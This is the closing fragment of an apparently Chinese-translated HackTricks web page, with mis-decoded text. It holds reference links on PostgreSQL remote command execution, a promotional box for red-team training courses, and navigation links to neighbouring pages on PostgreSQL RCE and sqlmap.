<li><a href="https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/">https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/</a></li>
<li><a href="https://www.exploit-db.com/papers/13084">https://www.exploit-db.com/papers/13084</a></li>
</ul>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../../pentesting-web/sql-injection/sqlmap/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../../pentesting-web/sql-injection/sqlmap/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
